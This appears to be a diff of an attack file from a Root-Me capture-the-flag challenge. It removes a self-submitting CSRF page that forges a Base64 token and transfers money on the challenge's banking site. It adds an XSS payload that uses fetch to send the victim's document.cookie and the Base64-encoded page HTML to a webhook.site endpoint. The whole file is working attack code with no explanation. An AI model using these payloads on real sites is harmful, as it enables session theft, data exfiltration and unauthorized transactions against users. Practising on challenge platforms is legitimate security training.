@@ -1,25 +1,4 @@
-<html>
-  <body onload="document.forms[0].submit()">
-    <script>
-      function generateToken(user, amount) {
-        let rawToken = `CSRFs_4r3_c00l:${user}:${amount}`;
-        let encodedToken = btoa(rawToken); // Codifica en Base64
-        return encodedToken;
-      }
+<script>
+fetch("https://webhook.site/b73366d6-2da0-4fc6-aca2-8ac37c9e8101?cookie="+document.cookie+"&html="+btoa(document.body.innerHTML));
+</script>
 
-      let user = "the_zucccccck"; // Cambia esto por el usuario deseado
-      let amount = "2513699514"; // Cambia esto por la cantidad deseada
-      let token = generateToken(user, amount);
-      let userRecibidor = "user";
-      let amountRecibidor = 1000000;
-
-      document.write(`
-        <form action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
-          <input type="hidden" name="token" value="${token}" />
-          <input type="hidden" name="recipient" value="${userRecibidor}" />
-          <input type="hidden" name="amount" value="${amountRecibidor}" />
-        </form>
-      `);
-    </script>
-  </body>
-</html>
